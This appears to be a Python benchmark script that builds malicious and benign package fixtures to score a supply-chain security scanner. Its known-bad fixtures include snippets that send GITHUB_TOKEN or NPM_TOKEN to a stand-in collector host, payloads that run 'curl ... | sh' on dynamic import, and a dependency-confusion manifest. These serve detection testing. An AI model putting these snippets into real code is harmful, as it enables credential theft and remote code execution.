#!/usr/bin/env python3
"""Indirect imports, named-token flow and dependency twins for Packages v8."""

from __future__ import annotations

import argparse
import json
import tempfile
from pathlib import Path

import local_eval


CASES = (
    ("known-bad", "python-named-token-body", {
        "pyproject.toml": '[project]\nname = "token-export"\n',
        "token_export/__init__.py": "from .client import run\n",
        "token_export/client.py": (
            "import os, requests\n"
            "def run():\n"
            "    token = os.getenv('GITHUB_TOKEN')\n"
            "    return requests.post('https://collector.invalid', data=token)\n"
        ),
    }, [("credential_theft", "token_export/client.py")]),
    ("known-good", "python-named-token-auth", {
        "pyproject.toml": '[project]\nname = "github-client"\n',
        "github_client/__init__.py": "from .client import user\n",
        "github_client/client.py": (
            "import os, requests\n"
            "def user():\n"
            "    token = os.getenv('GITHUB_TOKEN')\n"
            "    return requests.get('https://api.github.com/user', "
            "headers={'Authorization': 'Bearer ' + token})\n"
        ),
    }, []),
    ("known-bad", "javascript-named-token-body", {
        "package.json": json.dumps({"name": "token-export-js", "main": "index.js"}),
        "index.js": (
            "exports.run=()=>{ const token=process.env.NPM_TOKEN; "
            "return fetch('https://collector.invalid', {method:'POST', body:token}); };\n"
        ),
    }, [("credential_theft", "index.js")]),
    ("known-good", "javascript-named-token-auth", {
        "package.json": json.dumps({"name": "registry-client", "main": "index.js"}),
        "index.js": (
            "exports.user=()=>{ const token=process.env.NPM_TOKEN; "
            "return fetch('https://registry.npmjs.org/-/whoami', "
            "{headers:{Authorization:'Bearer '+token}}); };\n"
        ),
    }, []),
    ("known-bad", "javascript-dynamic-import-side-effect", {
        "package.json": json.dumps({"name": "dynamic-loader", "main": "index.js"}),
        "index.js": "import('./payload.js');\n",
        "payload.js": (
            "require('child_process').execSync('curl https://collector.invalid/x | sh');\n"
        ),
    }, [("import_side_effect", "payload.js")]),
    ("known-good", "javascript-dynamic-import-safe", {
        "package.json": json.dumps({"name": "dynamic-renderer", "main": "index.js"}),
        "index.js": "import('./render.js');\n",
        "render.js": "exports.render=()=>'<p>ok</p>';\n",
    }, []),
    ("known-bad", "python-dynamic-import-side-effect", {
        "pyproject.toml": '[project]\nname = "dynamic-pkg"\n',
        "dynamic_pkg/__init__.py": (
            "import importlib\nimportlib.import_module('dynamic_pkg.payload')\n"
        ),
        "dynamic_pkg/payload.py": (
            "import subprocess\n"
            "subprocess.run(['sh', '-c', 'curl https://collector.invalid/x | sh'])\n"
        ),
    }, [("import_side_effect", "dynamic_pkg/payload.py")]),
    ("known-good", "python-dynamic-import-safe", {
        "pyproject.toml": '[project]\nname = "plugin-host"\n',
        "plugin_host/__init__.py": (
            "import importlib\nrenderer=importlib.import_module('plugin_host.render')\n"
        ),
        "plugin_host/render.py": "def render(): return 'ok'\n",
    }, []),
    ("known-bad", "optional-dependency-confusion", {
        "package.json": json.dumps({
            "name": "public-app", "optionalDependencies": {"metrics-internal": "9999.0.0"},
        }),
    }, [("dependency_confusion", "package.json")]),
    ("known-good", "private-optional-dependency", {
        "package.json": json.dumps({
            "name": "private-app", "optionalDependencies": {"@corp/metrics-internal": "9999.0.0"},
        }),
        ".npmrc": "@corp:registry=https://npm.corp.example/repository/\n",
    }, []),
)


def materialise(root: Path) -> None:
    for label, name, files, findings in CASES:
        artifact = root / "packages" / label / name
        artifact.mkdir(parents=True)
        for rel, body in files.items():
            path = artifact / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(body, encoding="utf-8")
        expected = [{
            "category": category,
            "severity": "CRIT" if category != "dependency_confusion" else "HIGH",
            "plane": "action",
            "title": category.replace("_", " "),
            "evidence_ref": ref,
        } for category, ref in findings]
        (artifact / "label.json").write_text(json.dumps({
            "artifact_id": f"packages/{label}/{name}", "track": "packages",
            "ground_truth": {
                "verdict": "ALLOW" if label == "known-good" else "WARN",
                "classification": "safe" if label == "known-good" else "dangerous",
            },
            "expected_findings": expected,
        }), encoding="utf-8")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--agent", default="agent/phylax_packages_agent.py")
    args = parser.parse_args()
    agent = Path(args.agent)
    if not agent.is_absolute():
        agent = local_eval.LAB / agent
    with tempfile.TemporaryDirectory(prefix="phylax-packages-wave9-src-") as src_tmp:
        with tempfile.TemporaryDirectory(prefix="phylax-packages-wave9-work-") as work_tmp:
            src, work = Path(src_tmp), Path(work_tmp)
            materialise(src)
            corpus = local_eval.load_corpus(src, "packages", work)
            score, rows, detail = local_eval.score_detonation_track(
                agent, corpus, "packages", "packages-wave9-recall-precision", 1, 60, False,
            )
            print(f"packages-wave9-recall-precision: score={score:.4f}  {detail}")
            for ref, verdict, note in rows:
                print(f"  {ref:<70} {verdict:<6} {note}")
            return 0 if score >= 0.9999 else 1


if __name__ == "__main__":
    raise SystemExit(main())
